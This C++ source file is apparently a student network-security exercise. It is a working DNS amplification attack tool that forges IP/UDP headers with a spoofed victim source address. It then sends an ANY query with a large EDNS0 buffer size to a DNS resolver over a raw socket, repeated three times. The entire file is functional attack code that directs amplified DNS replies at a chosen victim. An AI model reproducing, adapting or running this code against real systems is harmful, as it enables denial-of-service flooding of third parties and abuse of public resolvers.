#include "dns_attack.h"

#define DES_PORT 53

using namespace std;


unsigned short chksum(unsigned short* buff, int _16bitword) {
	unsigned long sum;
	for(sum = 0; _16bitword > 0; _16bitword--)
		sum += htons(*(buff)++);
	sum = ((sum >> 16) + (sum & 0xFFFF));
	sum += (sum>>16);
	return (unsigned short)(~sum);
}

int dns_domain_name(unsigned char *name_buffer, string d) {
	stringstream domain(d);
	string sub;
	int tot = 0;
	while(getline(domain, sub, '.')) {
		tot++;
		int l = sub.length();
		*name_buffer++ = l;
		for(int j = 0; j < l; ++j) {
			*name_buffer++ = (char) sub[j];
			tot++;
		}
	}
	*name_buffer = 0;
	return ++tot;
}

int main(int argc, char* const argv[]) {

	if(argc != 4) {
		cout << "please input 3 parameters: victim_address, victim_port, dns_address" << endl;
		return 0;
	}

    int sd, tot_len = 0;
    unsigned char buffer[4096];						// assume all requires 64 bytes
    struct iphdr *iph = (struct iphdr *) buffer;	// iph point to the first part of buffer
    struct udphdr *udph = (struct udphdr *) (buffer + sizeof(struct iphdr));	// plus the size of iphdr
	struct dnshdr *dnsh = (struct dnshdr *) (buffer + sizeof(struct iphdr) + sizeof(struct udphdr));
	struct dnsqry *query;
	struct edns *e;
	struct sockaddr_in addr;

	memset(buffer, 0, 4096);

    // fill ip header
    iph->version = 4;
    iph->tos = 16;						// what is this?
    iph->ihl = 5;                       // Internet Header Length (IHL), which is the number of 32-bit words in the header
    iph->id = htons(6016);                   // id of this packet
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = 17;						// udp
    iph->check = 0;
    iph->saddr = inet_addr(argv[1]);         // ip spoof
    iph->daddr = inet_addr(argv[3]);
	tot_len += sizeof(struct iphdr);

    udph->source = htons(atoi(argv[2]));
    udph->dest = htons(DES_PORT);                 // not sure
    udph->check = 0;
	tot_len += sizeof(struct udphdr);
	
	// dns in udp payload
	dnsh->id = 0xB0DF;						// last 2 bytes of sID 0516016
	dnsh->flag = htons(0x0100);
	dnsh->qs_c = htons(1);
	dnsh->ans_c = 0;
	dnsh->ah_count = 0;
	dnsh->ar_count = htons(1);
	tot_len += sizeof(struct dnshdr);

	tot_len += dns_domain_name(buffer + tot_len, "nctu.edu.tw");
	query = (struct dnsqry *) (buffer + tot_len);
	query->t = htons(255);
	query->c = htons(1);
	tot_len += sizeof(struct dnsqry);

	// edns
	buffer[tot_len++] = 0;
	e = (struct edns *) (buffer + tot_len);
	e->edns_type = htons(41);
	e->edns_class = htons(0x1000);
	e->edns_ttl_up = 0;
	e->edns_ttl_low = htons(0x8000);
	e->edns_rdlen = 0;
	tot_len += sizeof(struct edns);


	// tot_len and chksum
	iph->tot_len = htons(tot_len);
	iph->check = chksum((unsigned short*)buffer, sizeof(struct iphdr) / 2);
	udph->len = htons(tot_len - sizeof(struct iphdr));

    // create a socket
    if((sd = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("error when create socket");
        exit(0);
    }
	int one = 1;
	const int *val = &one;
	if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
    	perror("setsockopt() error");
    	exit(0);
 	}
	// sockaddr
	addr.sin_family = AF_INET; 
    addr.sin_addr.s_addr = inet_addr(argv[3]);
    addr.sin_port = htons(DES_PORT); 

	cout << "dns attack first attempt!" << endl;
	if((sendto(sd, buffer, tot_len, 0, (struct sockaddr*) &addr, sizeof(addr))) < 0) {
        perror("error when sendto");
        exit(0);
	}
	usleep(200);
	cout << "dns attack second attempt!" << endl;
	if((sendto(sd, buffer, tot_len, 0, (struct sockaddr*) &addr, sizeof(addr))) < 0) {
        perror("error when sendto");
        exit(0);
	}
	usleep(200);
	cout << "dns attack third attempt!" << endl;
	if((sendto(sd, buffer, tot_len, 0, (struct sockaddr*) &addr, sizeof(addr))) < 0) {
        perror("error when sendto");
        exit(0);
	}

}
